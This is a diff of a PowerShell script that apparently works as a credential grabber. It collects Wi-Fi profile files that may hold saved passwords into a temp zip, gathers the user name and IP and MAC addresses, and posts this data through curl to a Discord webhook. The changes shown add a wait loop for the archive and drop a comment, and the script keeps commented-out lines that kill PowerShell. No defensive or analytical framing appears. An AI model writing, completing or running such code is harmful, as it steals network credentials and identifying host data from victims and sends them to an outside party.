@@ -23,7 +23,10 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 
 # Scrape the localappdata for password files (zipping as an example)
 $zip = "$env:TEMP\funny_stuff_folder.zip"
-Compress-Archive -Path "$e\Wi-Fi*.xml", $wifiFile -DestinationPath $zip -Force
+while (-not (Test-Path $zip)) {
+    Start-Sleep -Seconds 1
+}
+
 
 $whoami_content = whoami
 
@@ -37,7 +40,6 @@ $ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 $info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ')"
 $content = "$($whoami_content) | $info | @everyone"
 
-# Specify the Discord webhook (should be set somewhere, example variable below)
 
 Start-Process curl.exe -ArgumentList @(
     '-X', 'POST',
@@ -56,4 +58,3 @@ Start-Process curl.exe -ArgumentList @(
 
 #exit quickly
 #taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
-
